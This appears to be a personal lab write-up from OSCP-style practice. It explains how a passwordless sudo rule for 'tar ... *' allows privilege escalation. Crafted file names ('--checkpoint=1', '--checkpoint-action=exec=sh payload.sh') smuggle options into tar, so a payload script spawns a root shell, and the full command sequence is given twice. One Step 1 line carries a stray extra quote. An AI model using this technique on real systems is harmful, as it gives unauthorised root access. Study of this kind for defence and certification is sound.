# tar
- https://gtfobins.github.io/gtfobins/tar/#limited-suid
## TLDR
- `sudo -l` command shows that user **james** can run the following command as root **without a password**: 
- tar has options  which will stop it during processing, allowing for command execution
- we trick ta  by passing these options, with special characters, so they look like files, but  processed like options 
```
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh payload.sh"
echo "/bin/bash" > payload.sh  
chmod +x payload.sh 
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```
## exploit
### What / Why
The `sudo -l` command shows that user **james** can run the following command as root **without a password**:  
**sudo /usr/bin/tar -czvf /tmp/backup.tar.gz ***

- `tar` has a feature that allows it to execute a command when it reaches a certain point in its process. This is done using two options:
	- `--checkpoint=1`: This tells `tar` to trigger an action after processing just **one file**.
	- `--checkpoint-action=exec=<command>`: This allows executing a command when the checkpoint is reached.
- Since James can run `tar` as root, we can abuse the `--checkpoint-action` option to execute **any command** as root.
- We **trick** `tar` into processing these options as filenames. The reason we create **two separate files** is due to **how spaces and special characters are interpreted** in Linux:

--- 
### Spaces in Filenames
1. Spaces in Filenames:
	- The shell interprets spaces as **separators between arguments**.
	- If we tried to create a single file named `--checkpoint=1 --checkpoint-action=exec=/bin/sh`, it would **not work properly** because the shell would treat it as two separate arguments instead of one filename.
2. The `/` Character Issue:
- The `/` character is interpreted as a *directory separator*.
- If we try to create a file like `--checkpoint-action=exec=/bin/sh`, it will not work because the system expects it to be a **file path**, not just a filename.

### Step 1: Create Two Files
We create **two special filenames** so that `tar` interprets them as arguments:

echo "" > ""--checkpoint=1" 
echo "" > "--checkpoint-action=exec=sh payload.sh"

- The first file is named `--checkpoint=1`, which tells `tar` to **trigger an action** after processing one file.
- The second file is named `--checkpoint-action=exec=sh payload.sh`, which tells `tar` to execute `sh payload.sh` as root.

### Step 2: Create a Payload
Next, we create a simple payload script that opens a **root shell**:

echo "/bin/bash" > payload.sh  
chmod +x payload.sh

### Step 3: Run `tar`

Now, when we run:  
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *

- `tar` will process the files in the current directory.
- Since we **named our files like command-line options**, `tar` will interpret them as real arguments.
- It will **execute** `**sh payload.sh**` **with root privileges**.
- `payload.sh` runs `/bin/bash`, giving us **a root shell**.

----
# Reference

- Checkpoint - Offesec - Practice
- https://systemweakness.com/pg-cockpit-oscp-prep-cc0ff57842f7
---


